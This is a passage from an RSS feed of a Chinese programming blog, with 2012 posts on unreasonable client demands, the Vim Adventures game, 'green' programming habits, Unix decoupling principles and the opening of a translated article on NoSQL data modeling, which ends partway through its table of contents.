<p>点子又来了，这次我要求5天做出来，这个点子和上个点子类似，我倒要看看5天能不能做出来~  ZWZX公司负责人一副痛苦的表情，我会不会逼的太紧了，5天是不是真的做不出来？到时候看看吧，如果5天没做出来估计是我给的时间太少了。</p>
<p>5天过去了ZWZX公司的负责人很高兴的拿出了我要的功能实现，哎，看来开始真的骗了我两天。就是不知道5天会不会还是多了啊？下次给3天~</p>
<p>又拿出来了，虽然他装的好像时间太紧似的，可别以为我不知道，你第一个功能最多3天就做出来了，我还给了你7天的项目经费，你们多赚了我多少啊！！！！ 真是没良心。 下次1天！！！</p>
<p>啊啊啊啊啊啊啊啊!!! 1天就出来了，这些人。。。。。  有没有良心，原来做这个这么简单，以后就给1天，不 ！ 一天N个功能。</p>
<p><strong>故事二：</strong><br>
我买了个电脑，没什么别的用途，就是打开电脑上上网，上上QQ和儿子聊聊天，QQ是儿子给我装上的，这样我就可以和他视频了。有一次QQ提醒我说我的QQ版本太低了，不能视频了，我打电话问儿子，儿子说按提示升级一下QQ就行了，呵呵，我按QQ的提示，儿子的指示一步一步的升级QQ成功了，看来电脑也不难啊！</p>
<p><strong>到这里您认为开始的两个故事的罪魁祸首是谁啊？</strong></p>
<p>我们一直以加班，甚至通宵去满足客户不合理的要求，只因为他是客户。只因为人人都认为满足客户的要求是我们最大的<br>
价值，可是不合理的要求不能去拒绝吗？套用刘欢说的一句话“我们是不是活的应该有些尊严”，一味的迎合客户，只会让我们自己越来越痛苦，反而得不到用户的尊重，肯定。</p>
<p>我一直有个疑惑，很多人说网站不支持IE6，而选择让用户去升级IE，这样的用户体验不好！如果按照按照这个逻辑，是不是我们都应该是Web应用，而且都应该是IE6下的Web应用呢？为什么微软还要出WIN8，一直XP不是挺好的吗？让用户升级系统，用户体验多么不好啊？QQ，360，搜狗输入法，等等客户端软件用户体验不都不好吗？ 都还要用户下载。</p>
<p>实在搞不懂为什么我们做个东西非要去支持IE6呢？检测到用户是IE6，给个提示，给个升级链接不就行了？ 这样做用户体验是有多么不好吗？ 你天天去支持IE6，还要天天磨叽用户使用IE6，你不觉的很矛盾吗？再说我一个普通用户，你如果不提醒，我怎么知道要升级IE6啊？</p>
<p><strong>对于遭遇了故事一，故事二的人只能送上一句话“哀其不幸，怒其不争！”</strong></p>
<p>原文链接：<a href="https://hfcc8685.github.com/blog/2012/04/19/shui-zhi-cuo/" target="_blank">http://hfcc8685.github.com/blog/2012/04/19/shui-zhi-cuo/</a></p>
 ]]></content>
<pubDate>2012-04-19T10:11:05+08:00</pubDate>
<guid>https://coolshell.cn/articles/7126.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 游戏：VIM大冒险 ]]></title>
<link>https://coolshell.cn/articles/7166.html</link>
<content><![CDATA[ 
<p>不知道大家是否还记得“<a title="简明 Vim 练级攻略" href="https://coolshell.cn/articles/5426.html" target="_blank">Vim简明攻略</a>”呢？你是不是对Vim的那一大堆热键很头痛呢？现在好好，下面这个游戏是一个使用VIM热键玩的游戏。你可以在玩游戏的过程中熟悉Vim的热键。</p>
<p><strong>你可以点击图片，或是图片下的网址打开这个游戏</strong></p>
<p style="text-align: center;"><strong><a href="https://vim-adventures.com/" target="_blank">http://vim-adventures.com/</a></strong></p>
<p style="text-align: center;"><a href="https://vim-adventures.com/" target="_blank"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">我试玩了一下这个游戏，真的很不错，下面是一些我给的游戏攻略。</p>
<p style="text-align: left;"><span id="more-7166"></span></p>
<ul>
<li>第一关，场景一，首先是使用vim的h, j, k, l四个键来控制方向。（如果你妄图使用光标键的话，系统会出现黄色警告的）你需要使用h, j, k, l 四个方向走到图的右边，找到一把钥匙。（注意：迷宫墙上有些斜面，你可以通过斜面），找到钥匙后，钥匙会出现在你的右上角的位置，示意着你的光标要向那个方向移动，当你到达一个门的时候，会自动开门，进入第二关。</li>
</ul>
<ul>
<li>第二关，每一关的小人都会给你一些英文提示，教你怎么玩。关于第二关，你会看到你过不去，小会提示你，那些绿草地就向我们文件中的行，你在行上按上下键，光标会在这一列上移动，如果这一下面的一行没有这么长，光标会到行尾。这个vim的特性会告诉我们如何过这一关——移到最上面的行尾（因为是最长的可以越过最下面的障碍），然后按下光标键，到最后一行时你就会发现光标已经过了阻碍。如此通过第二场景，达到一个小人后，按下键，进入第二关。</li>
</ul>
<ul>
<li>第三关，我们可以看到地图上有很多的字母，我们还可以看到有两个键，一个是w，一个是e，我们可以把光标移到w上吃到w后，我们就可以使用w键了——以单词为单位移动光标，这样，我们就可以吃到e了和第一把钥匙，我们按w和e我们就可以看到这两个按键都是以单词为单位移动光标的，一个是单词头，一个是单词尾（参看我以前给大家的<a title="给程序员的VIM速查卡" href="https://coolshell.cn/articles/5479.html" target="_blank">vim按键速查卡</a>）。然后，我们在最后一行通过单词跳跃到最右边吃到b—— 回到该单词的头，可以得到第二把钥匙。然后往上走，使用b 和 e键拿到第三把钥匙。然后就可以打开三个门通关了。</li>
</ul>
<figure id="attachment_7174" aria-describedby="caption-attachment-7174" style="width: 431px" class="wp-caption aligncenter"><a href="https://vim-adventures.com/"><img alt="image placeholder" ></a><figcaption id="caption-attachment-7174" class="wp-caption-text">Vim Adventures 第三关</figcaption></figure>
<p style="text-align: left;">然后，就需要你注册才能玩了。作者说，因为需要发的邮件太多了，所以现在系统发不出邮件了，请等待。所以，不知道作者是用来收集邮件的，还是没有开发完，不过，<strong>这个游戏的创意实在是太赞了</strong>。推荐给大家。</p>
<p style="text-align: left;"><strong>哪位会做游戏又熟Vim的朋友也能做一个？</strong></p>
<p style="text-align: left;">（全文完）</p>
<p></p>
 ]]></content>
<pubDate>2012-04-26T08:22:22+08:00</pubDate>
<guid>https://coolshell.cn/articles/7166.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 做个环保主义的程序员 ]]></title>
<link>https://coolshell.cn/articles/7186.html</link>
<content><![CDATA[ 
<p><strong></strong>十多年前刚走入社会工作的时候，那时的中国软件开发根本没有什么版本管理，也没有什么编程规范，软件开发相比起今天来说非常地混乱，那时仅凭自己的一些学习总结了一些C语言编程中的好的小笔记，后来，这些笔记写成了一篇叫《<a href="http://blog.csdn.net/haoel/article/details/2872" target="_blank">编程修养</a>》的文章。今天，又有些感触，想把这个话题扩大一下，从“个人修养”扩大到“环境保护”，所谓，穷则独善其身，富则达济天下，今天的技术人员比十多年前在技术和环境上都富有了许多，所以，也应该或多或少地担负起“达济天下”的责任了。</p>
<p>环境保护说白了就是保护一个良好的环境，为好的环境添砖加瓦，与破坏环境的人和事做斗争。其实，从技术人员来说，我们可以做一些力所能及的事。因为我们身边的技术环境还有很大的改善的空间，而一些来之不易的东西还需要我们去小心维护。另外，对于我们自己来说，少吃一些垃圾食品，健康生活，对自己也有益。</p>
<h4>环保主义软件开发</h4>
<p><strong><img alt="image placeholder" ></strong>先说说软件开发中的环保。比如：</p>
<ul>
<li>
<strong>环保需求</strong>。当我们分析需求的时候，如果我们能做到不要像“<a title="这到底是谁之错？" href="https://coolshell.cn/articles/7126.html" target="_blank">这是到底是谁的错</a>”一文中那样的来者不拒，如果我们在面对需求能多问这样几个问题：为什么 要有这样的需求？这个功能主要能解决什么 样的问题？为什么不是另外那一种？可不可以简化一下？其实，我们并不需要创新，只需要真正地问好这几个问题，我们就可以少看着一些弯路，少一些苦逼的加班，少一些内耗，少一些埋怨，也就可以为这个社会节省下一些资源，从而环保。</li>
</ul>
<div></div>
<ul>
<li>
<strong>环保开发</strong>。当我们做设计写代码的时候，如果我们多花一些时间去思考一下，我们就可以少一些代码（参看“<a title="多些时间能少写些代码" href="https://coolshell.cn/articles/5686.html" target="_blank">多一些时间少一些代码</a>”）。如果我们在一开始多思考一下，不要急着马上去用迭代的方式认识世界，多思考一下怎么把复杂的东西解藕，把复杂的东西简化，怎么做出一个优雅的设计，怎么让我们的程序少一些tricky的东西，怎么让我们的程序变得更简洁，更清楚，更直，在一开始思考一下未来需求可能的变化，未来软件需要怎么测试，未来的系统需要怎么的运维，那么，我们可以少一些返工，少一些重构，少欠一些债，少一些低级错误，少承担一些系统上线后的压力，那么，我们同样可以为这个社会节约一些资源。说得再直白一点，你用更少的代码产生出更高的效益，少耗一些CPU，就能省一些电，间接地保护了环境。（参看<a title="Why C++ ? 王者归来" href="https://coolshell.cn/articles/6548.html" target="_blank"> Why C++？</a>）</li>
</ul>
<div><span id="more-7186"></span></div>
<ul>
<li>
<strong>环保文化</strong>。当我们在做软件开发的时候，如果你能影响并帮助你身边的同事，让他们写出更有修养更有效率质量更高的代码来，并发动团队树立工程师的文化，用团队去影响你的老板，你的公司，让他们能再多一点地重视技术，重视技术人员，那么你必然也会成为一个受益者。</li>
</ul>
<div></div>
<ul>
<li>
<strong>环保管理</strong>。当你做为一个管理者，做为一个方法推动者，如果你能更多地注重软件开发中真正创造生产力的程序员，为他们分忧，为他们铺路，为他们创造条件，那么，他们就会更多的回馈于你，就会少了一些不信任，就会少了一些被动，就会多一些主动，就会多一分责任，不但可以激发团队热情，同时可以有更大的生产力。同样是一种环保。</li>
</ul>
<p>当然，这样的东西还有很多，你也可能会觉得太过理想主义了，我们不可能马上改变之，但是我们可以试一试。</p>
<h4>技术环保主义</h4>
<p>其实，我们身边有很多可以做的技术环保工作。比如说，在Linux下少用root用户，SQL的时候，delete前先select，这样，你就不会做出一些让你后悔的事（参看<a title="程序员那些悲催的事儿" href="https://coolshell.cn/articles/3980.html" target="_blank">程序员那些悲催的事</a>），不会让你重头来过，从而至少不会浪费电能。写代码的时候要很小心管理好内存，以及各种资源，和线程并发，组织好的你的代码中的业务逻辑，做好单元测试，自动化回归测试，等，这样你就可以少一点遇到BUG，在遇到BUG时少一些时间去做调查。操作电脑的时候少下一些破解软件，少访问一些乱七八遭的网站，这样，你就会少中一些病毒，少一些损失，少一些重做系统，一样可以节省电能，最重要的是可以节省你的很多时间，让你可以去做一些更有价值 的事情。</p>
<p>当然，除此之外，我们更应该做为一个大气的，高瞻的环保主义者，比如下面的事情：</p>
<ul>
<li>
<strong>拒绝IE6</strong>。如果你坚决不用IE6，并影响你身边的人，让他们升级IE6，尝试Chrome 或 Firefox，多告诉一下自己身边的朋友，怎么设计口令，怎么在互联网上保护自己的隐私和安全，怎么防木马，这样就能少一些问题，少装两次系统，就能省一些电，也就能多一些时间去做一些更有意义的事。也是在为整个世界整个人类做贡献。（<strong>看看某些软件产商，占据着用户桌面的江山，还整天弹窗弹窗的，说这不安全，那不安全的。你还是做安全的，你居然能容忍IE6装在用户的机器上，你还做个屁的安全！</strong>）2011年3月份，<a title="中国仍是IE6的重灾区" href="https://coolshell.cn/articles/3921.html" target="_blank">我国的IE6用户的百分比是34%</a>， 那时中国网民4.5亿，平均每三个人中有一个，2012年3月份，中国的比例还有24%左右，不过<a href="http://it.sohu.com/20120116/n332237326.shtml" target="_blank">中国的网民数达到了5.13亿</a>，也就是说，平均5个人里有一个，但是中国依然是全世界的IE6占有量最大的，参看下图（来自：<a href="http://www.ie6countdown.com/">http://www.ie6countdown.com</a>）面对下面的图片，你作何感想呢？</li>
</ul>
<p style="text-align: center;"><em>“<strong><span style="color: #cc0000;">Friend Don’t Let Friend Use IE6</span></strong>”</em></p>
<div><a href="http://www.ie6countdown.com"><img alt="image placeholder" ></a></div>
<div></div>
<ul>
<li>
<strong>拒绝破解软件</strong>。为什么要拒绝这些东西，因为你恐怕不知道这个软件的危害，包括一些汉化版的开源软件。这些软件中都会带 一些木马，比如：你下个putty的中文版，结果里有木马，人家就把你网站的口令盗了。关于网游，你可能不知道，连接网游私服的电脑基本上全是肉鸡，而 且，有很多的站点骗你下载软件破解程序，其实你下载到了一个木马。等等。这些生活都非常地不健康。</li>
</ul>
<ul>
<li>
<strong>拒绝抄袭和山寨</strong>。如果你鄙视那些赤祼祼地抄袭者，不使用他们的产品，有的人会说你就是想标榜自己的高尚，ZB，假高尚，大家会说你没有必要。其实并不是，你这样做，其实是为了“环保”，为了“保护一个健康的IT环境”，虽然你没有创新，但是你的行为却是在鼓励创新的环境，这样，如果当整个大环境都是在创新文化影响之下，才会更健康，技术人员也才会被尊重，而我们自己最终会受益。虽然只是抑制抄袭和山寨，但是我们间接地为社会做了贡献。（看看那N多的抄袭团队，加入他们实在是耗费这个社会的资源） （那个整天复制这个复制这个复制那个的公司，看看你自己做的那些产品线？乱糟糟的。<strong>你自己看看，你有个人空间，还有群空间，还有校友录，然后你还要做个facebook式的“朋友”，还要搞个微博，然后还要搞个微信，大哥啊，你把这些相似度很大的东西放在了N多的服务器上，你不觉得浪费吗？你真是山寨之王啊，自己都一直在复制自己的产品</strong>。还有人说你们的产品经理一流，真是脑残啊。对于你们的复制精神，我只能拜了！）</li>
</ul>
<ul>
<li>
<strong>拒绝百度搜索</strong>。如果你学得百度还是可以的话，你不妨看看我的微博（<a href="https://weibo.com/1401880315/ybN502xZ9" target="_blank">这个</a>，<a href="https://weibo.com/1401880315/ye6wNFTUW" target="_blank">这个</a>（<a href="https://weibo.com/1401880315/ye6E0a4zN" target="_blank">抓图</a>），还有和<a href="https://weibo.com/1401880315/yfC4yzonW" target="_blank">这个</a>和 <a href="https://weibo.com/1401880315/zlS3IbbEH" target="_blank">这个</a>）（以前，<a href="http://www.techweb.com.cn/it/2012-01-31/1145906.shtml" target="_blank">百度搜索出来的很多的开源软件（PuTTY、WinSCP）的第一个链接全是带木马的</a>，百度就是一个网上的病毒 )，你会发现百度不单单是广告的问题，很多东西根本搜不出来，包括他自己的内容。<strong>用百度就是浪费时间，浪费计算资源</strong>。如果你告诉你身边的朋友不要用百度搜索，而是用Google，并能耐心地教会他们翻墙，这样，我们就可以让那些“穷则穷凶极恶，富则为富不仁”的企业少一些自以为是，最重要的是可以让他们少制造一些垃圾信息和垃圾产品，世界少一些垃圾，自然也就环保了。</li>
</ul>
<ul>
<li>
<strong>拒绝过重的商业氛围</strong>。很多社区的商业氛围实在是太浓了，全都是广告。整个社区根本都不是为技术人员来做的，而为了那些软件产商，为了那些公司。他们只知道为那些大公司写软文，做广告，开大会。他们只想着挣钱。网页上全是花花绿绿的广告，打开他们的网页，就会多耗许多电，浏览他们网站上的文章，到他们的大会上听他们的软件广告分享，就会让自己的生命和时间浪费，自己消耗了体力不说，却还没得到什么营养，相当的不环保。</li>
</ul>
<ul>
<li>
<strong>拒绝浮燥</strong>。比如：浮燥地创业者们，被风投们一轮一轮地压榨。为了让风投满意，牺牲自己的初衷，去找水军刷排名，去发垃圾邮件，去烧钱买吆喝，制造虚假的繁荣，等等。另外，少去追那些新的技术，少一些浮夸，不要开口闭口的就是海量数据，高性能，要当个架构师，经理，要拿多少多少的工资，与其这样，还不如多静下心来研究一下那些十来年的技术，思考一下自己身边的问题，一步一步走踏实，少摔几个跟头，这样，你也就能多一些能力，多一些自信，也就能多做一些事，多解决一些问题，你的职业生源走好了，也就很环保了。</li>
</ul>
<p>还有很多，我相信大家明白我想说什么。<strong></strong>其实，我想说的是，<strong>这不单单是一种“个人修养”，这也是一种对社会贡献的方式，更是一种“低碳环保”的生活方式</strong>。</p>
<p><span style="color: #cc0000;"><strong>让我们一起来做有修养的环保主义的程序员吧，少吃一些垃圾食品，多一些绿色的健康生活！</strong></span></p>
<p><em><strong>—————— 更新 2012年4月27 ——————</strong></em></p>
<p>我看到很多网友并不同意我的观点，并指责我的偏激和极端。挺好的，我知道，我说到了你们最敏感的地方，我很高兴。</p>
<p><strong>你可以对现实妥协，你可以继续钟爱你的垃圾食品，你可以继续使用百度搜索，你可以继续生活在墙内，我虽然替你感到惋惜，但是我不会勉强你，因为我能理解你可以不环保，本来也是，这些事情，你能做到固然好，你做不到，也是你的选择。每个人的生活每个人自己去选择，想健康地生活，或是不健康地生活，都是你自己的权利</strong>。</p>
<p>（全文完）</p>
<div><strong><br>
</strong></div>
<div><strong><br>
</strong></div>
<p></p>
 ]]></content>
<pubDate>2012-04-27T08:26:44+08:00</pubDate>
<guid>https://coolshell.cn/articles/7186.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 用Unix的设计思想来应对多变的需求 ]]></title>
<link>https://coolshell.cn/articles/7236.html</link>
<content><![CDATA[ 
<p>之前，@<a title="风枫峰" href="https://weibo.com/hfcc?source=webim" target="_blank">风枫峰</a> 在“<a title="这到底是谁之错？" href="https://coolshell.cn/articles/7126.html" target="_blank">这是谁的错？</a>”中说过开发团队对需求来者不拒，而@<a title="weidagang" href="https://weibo.com/weidagang" target="_blank">weidagang</a> 也在“<a title="需求变化与IoC" href="https://coolshell.cn/articles/6950.html" target="_blank">需求变更和IoC</a>”中说过用IoC来最大程度地解决需求变更。今天我也想从Unix设计思想的角度来说说什么是好的软件设计，什么样的设计可以把需求变更对开发的影响降低。（<strong>注意</strong>：这并不能解决用户或是PM的无理需求，面对无理需求，需要仔细分析需求，而用技术的手段无法搞定这个事，但是可以减轻需求变更带来的痛苦） 我曾经在<a href="https://coolshell.cn/articles/2324.html" target="_blank">《Unix传奇》的下篇</a>中写过一些Unix的设计哲学和思想（这里重点推荐大家看一下《<em><a href="http://product.china-pub.com/197413" target="_blank">The Art of Unix Programming</a></em>》，我推荐过多次了），以前也发过一篇《<a title="一些软件设计的原则" href="https://coolshell.cn/articles/4535.html" target="_blank">一些软件设计的原则</a>》，不过，这些东西都太多了，记不住。其实，这么多年来，我的经验告诉我，<strong>无论是Unix设计，还是面向对象设计，还是别的什么如SOA，ECB，消息，事件，MVC，网络七层模型，数据库设计，等等，他们都在干三件事——<span style="color: #cc0000;">解耦，解耦，还是解耦</span>！</strong>所谓解耦，就是让软件的模块和模块间尽量少地依赖起来。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4>现实当中的例子</h4>
<p>让我先举几个现实生活中的例子：</p>
<p style="padding-left: 30px;">1、现实社会中，制造灯具的工厂完全不关心制造灯泡的工厂，制造灯泡的工厂完全不关心制造灯具的工厂，但是，灯泡和灯饰可以很完美地组合成用户所喜欢的样子（这和@<a title="weidagang" href="https://weibo.com/weidagang" target="_blank">weidagang</a> 在“<a title="需求变化与IoC" href="https://coolshell.cn/articles/6950.html" target="_blank">需求变更和IoC</a>”说到的那个PC的例子相仿）。他们是怎么做到的？</p>
<p style="padding-left: 30px;">2、互联网上，做网站的人完全不用关心用户在用什么样的操作系统，什么样的客户端浏览器（当然事实上，浏览器的不标准让网站那边很头痛，这里只是举个例），反过来，上网的人也不关心做网站的人在用什么的技术开发网站。但是大家在完全不关心对方的情况下，可以很正常地协同工作在一起。为什么？</p>
<p><span id="more-7236"></span> 这样的例子太多了。为什么可以做成这样呢？因为大家依赖的是一个接口，灯具和灯泡并不互相依赖，他们依赖的是一个接口，做网站的人和浏览网站的人依赖的还是接口——HTTP协议。这就是面向对象的核心思想——依赖于接口而不是实现，这就是解耦。<strong>当你看过这两个例子以后，我希望你以后设计的软件至少不能比我们现实社会中的这些方法要差</strong>。不然，你就是在让社会倒退了，呵呵。 你会说，这和Unix，和应对需求变化有什么关系？好让我们再来看一下Unix的设计。</p>
<h4>Unix设计的例子</h4>
<p>下面是几个Unix下的例子：</p>
<p style="padding-left: 30px;">1、Unix下，所有的硬件都可以通过文件的方式存取。其统统在/dev下。于是，软件和硬件的耦合被解开了，操作系统只需要把硬件统统变成文件，而程序只需要使用三个东西，一个是fd，一个是read()，一个是write()，就可以来操作任意的硬件了，这就是抽象，简单到不行。</p>
<p style="padding-left: 30px;">2、Unix下，所有的命令都可以用管道串起来（管道绝对是个伟大的发明），这样，所有的命令间的交互全部解耦到只依赖于STD_IN, STD_OUT设备上。最酷的是，用户可以使用管道任意地拼装那些命令，以完成各式各样的功能。管道这个设计思想可以映射为今天的Web Service，你可以任意地拼装各种Web Service。</p>
<p>看到这里，你会发现，这还是解耦，本质上来说，也是一种依赖倒置——OOD的精髓。但是，Unix还不仅仅是这些。我们再来看几个例子：</p>
<p style="padding-left: 30px;">1、Unix下，软件都是绿色地安装。在iOS上更明显——各个程序间基本上互不干扰，这个程序产生的垃圾文件不会影响到另一个程序。你删掉一个程序不会让另一个程序不举，各是各的空间。你可以删除这些程序，只要把内核心留着，系统照样可以启动。</p>
<p style="padding-left: 30px;">2、Unix下，你可以通过设置一些环境变量，让多种环境同时存在，比如：某个LAMP用的是Apache 2.0, Mysql 4.0, PHP 4.0，某个LAMP用的是Apache 2.2, Mysql 5.0，PHP5.3，你不但可以方便地在系统中切换这两个环境，你甚至还可以同时启动他们。</p>
<p style="padding-left: 30px;">3、Unix下，你可以随意地替换你想要的程序。比如，你不喜欢bash，你可以替换成ksh/csh等，你不喜欢awk ，你可以替换成 gawk ，所有的东西都像零件一样，你不喜欢什么，你就可以替换什么。</p>
<p>这三个例子告诉了我们——<strong>当你把你的软件设计地耦合度非常地低时，你可以随意地组合，随意地安排你的系统</strong>。相当的灵活，灵活到Windows到今天都学不会。</p>
<h4>应对需求变化</h4>
<p>看到这里，你可能明白我想说的是什么了，你可能开始觉得怎么样的系统设计会更有效了。如果你还记得《<a title="SteveY对Amazon和Google平台的长篇大论" href="https://coolshell.cn/articles/5701.html" target="_blank">Steve Y 对平台的长篇大论</a>》，你就会知道我想说什么了。是的，我想说的就是，<strong>当你真正了解了Unix的设计思想后，你会觉得今天的很多东西都是对Unix设计思想的一种传承或是变种</strong>。这种东西就是：</p>
<p style="padding-left: 30px;">1）<strong>解耦，解耦，解耦</strong>。尽量地让你的模块不要在实现上耦合，而是耦合某个规范，某个标准。</p>
<p style="padding-left: 30px;">2）<strong>KISS，KISS，KISS</strong>。要做到高度解耦，你的模块就一定要很简单，当然不是说简单到只有几行代码，而是简单到只干一件事，并把这件事干到极致。然后通过某个标准拼装起来。</p>
<p style="padding-left: 30px;">3）<strong>拼装，拼装，拼装。</strong>我想不起来是谁说的了，这句话是这样的，当我想用一个模块的时候，我直接调用就好了，没有必要像C或Java一样，还要编译。是的，拼装需要一个框架，需要一种标准协议，然后让所有的系统都耦合在这种规范上，各自独立运行，就像一个机器上的各个部件一样，当我觉得这个部件不爽，换了就是了。（例如，当我们在尝试不同的算法的时候）</p>
<p>想想建材和家俱市场，无论用户过来想装修什么，我都可以满足用户的不同需求，只要你是和家装相关，我基本上都能满足你，不是吗？无论你怎么变，只要不变态，我基本上都可以满足你。这就是解耦，拼装带来的好处。 你可能会说我说得太简单了，另一方面，你可能觉得有一些系统这样做没必要，我承认，不过，你可以有选择的或多或少地试试。（其实，我相信你已经在不自觉得或多或少地使用这种方式开发软件了） （全文完）</p>
<div></div>
<p></p>
 ]]></content>
<pubDate>2012-05-03T08:14:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/7236.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ NoSQL 数据建模技术 ]]></title>
<link>https://coolshell.cn/articles/7270.html</link>
<content><![CDATA[ 
<p>全文译自墙外文章“<a href="https://highlyscalable.wordpress.com/2012/03/01/nosql-data-modeling-techniques/" target="_blank">NoSQL Data Modeling Techniques</a>”，译得不好，还请见谅。这篇文章看完之后，你可能会对NoSQL的数据结构会有些感觉。我的感觉是，关系型数据库想把一致性，完整性，索引，CRUD都干好，NoSQL只干某一种事，但是牺牲了很多别的东西。总体来说，我觉得NoSQL更适合做Cache。下面是正文——</p>
<p>NoSQL 数据库经常被用作很多非功能性的地方，如，扩展性，性能和一致性的地方。这些NoSQL的特性在理论和实践中都正在被大众广泛地研究着，研究的热点正是那些和性能分布式相关的非功能性的东西，我们都知道 <a href="https://en.wikipedia.org/wiki/CAP_theorem">CAP 理论</a>被很好地应用于了 NoSQL 系统中（陈皓注：CAP即，一致性(Consistency)， 可用性(Availability)， 分区容忍性(Partition tolerance)，在分布式系统中，这三个要素最多只能同时实现两个，而NoSQL一般放弃的是一致性）。但在另一方面，NoSQL的数据建模技术却因为缺乏像关系型数据库那样的基础理论没有被世人很好地研究。这篇文章从数据建模方面对NoSQL家族进行了比较，并讨论几个常见的数据建模技术。</p>
<p>要开始讨论数据建模技术，我们不得不或多或少地先系统地看一下NoSQL数据模型的成长的趋势，以此我们可以了解一些他们内在的联系。下图是NoSQL家族的进化图，我们可以看到这样的进化：Key-Value时代，BigTable时代，Document时代，全文搜索时代，和Graph数据库时代：（陈皓注：注意图中SQL说的那句话，NoSQL再这样发展下去就是SQL了，哈哈。）</p>
<div id="attachment_310">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/overview2.png"><img alt="image placeholder" ><br>
</a>NoSQL Data Models</p>
</div>
<p>首先，我们需要注意的是SQL和关系型数据模型已存在了很长的时间，这种面向用户的自然性意味着：</p>
<p><span id="more-7270"></span></p>
<ul>
<li>最终用户一般更感兴趣于数据的聚合显示，而不是分离的数据，这主要通过SQL来完成。</li>
<li>我们无法通过人手工控制数据的并发性，完整性，一致性，或是数据类型校验这些东西的。这就是为什么SQL需要在事务，二维表结构（schema）和外表联合上做很多事。</li>
</ul>
<p>另一方面，SQL可以让软件应用程序在很多情况下不需要关心数据库的数据聚合，和数据完整性和有效性进行控制。而如果我们去除了数据一致性，完整性这些东西，会对性能和分布存储有着重的帮助。正因为如此，我们才有数据模型的进化：</p>
<ul>
<li>
<strong>Key-Value 键值对存储</strong>是非常简单而强大的。下面的很多技术基本上都是基于这个技术开始发展的。但是，Key-Value有一个非常致命的问题，那就是如果我们需要查找一段范围内的key。（陈皓注：学过hash-table数据结构的人都应该知道，hash-table是非序列容器，其并不像数组，链接，队列这些有序容器，我们可以控制数据存储的顺序）。于是，有序键值 （Ordered Key-Value） 数据模型被设计出来解决这一限制，来从根本上提高数据集的问题。</li>
</ul>
<ul>
<li>
<strong>Ordered Key-Value 有序键值</strong>模型也非常强大，但是，其也没有对Value提供某种数据模型。通常来说，Value的模型可以由应用负责解析和存取。这种很不方便，于是出现了 BigTable类型的数据库，这个数据模型其实就是map里有map，map里再套map，一层一层套下去，也就是层层嵌套的key-value（value里又是一个key-value），这种数据库的Value主要通过“列族”（column families），列，和时间戳来控制版本。（陈皓注：关于时间戳来对数据的版本控制主要是解决数据存储并发问题，也就是所谓的乐观锁，详见《<a title="多版本并发控制(MVCC)在分布式系统中的应用" href="https://coolshell.cn/articles/6790.html" target="_blank">多版本并发控制(MVCC)在分布式系统中的应用</a>》）</li>
</ul>
<ul>
<li>
<strong>Document databases 文档数据库</strong> 改进了 BigTable 模型，并提供了两个有意义的改善。第一个是允许Value中有主观的模式（scheme），而不是map套map。第二个是索引。 <strong>Full Text Search Engines 全文搜索引擎</strong>可以被看作是文档数据库的一个变种，他们可以提供灵活的可变的数据模式（scheme）以及自动索引。他们之间的不同点主要是，文档数据库用字段名做索引，而全文搜索引擎用字段值做索引。</li>
</ul>
<ul>
<li>
<strong>Graph data models 图式数据库</strong> 可以被认为是这个进化过程中从 Ordered Key-Value 数据库发展过来的一个分支。图式数据库允许构建议图结构的数据模型。它和文档数据库有关系的原因是，它的很多实现允许value可以是一个map或是一个document。</li>
</ul>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#_NoSQL_%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B%E6%91%98%E8%A6%81" title=" NoSQL 数据模型摘要"> NoSQL 数据模型摘要</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-2" href="#%E6%A6%82%E5%BF%B5%E6%8A%80%E6%9C%AF_Conceptual_Techniques" title="概念技术 Conceptual Techniques">概念技术 Conceptual Techniques</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#1_%E5%8F%8D%E8%A7%84%E6%A0%BC%E5%8C%96_Denormalization" title="(1) 反规格化 Denormalization">(1) 反规格化 Denormalization</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#2_%E8%81%9A%E5%90%88_Aggregates" title="(2) 聚合 Aggregates">(2) 聚合 Aggregates</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#3_%E5%BA%94%E7%94%A8%E5%B1%82%E8%81%94%E7%BB%93_Application_Side_Joins" title="(3) 应用层联结 Application Side Joins">(3) 应用层联结 Application Side Joins</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-6" href="#%E9%80%9A%E7%94%A8%E5%BB%BA%E6%A8%A1%E6%8A%80%E6%9C%AF_General_Modeling_Techniques" title="通用建模技术 General Modeling Techniques">通用建模技术 General Modeling Techniques</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#4_%E5%8E%9F%E5%AD%90%E8%81%9A%E5%90%88_Atomic_Aggregates" title="(4) 原子聚合 Atomic Aggregates">(4) 原子聚合 Atomic Aggregates</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#5_%E5%8F%AF%E6%9E%9A%E4%B8%BE%E9%94%AE_Enumerable_Keys" title="(5) 可枚举键 Enumerable Keys">(5) 可枚举键 Enumerable Keys</a></li>
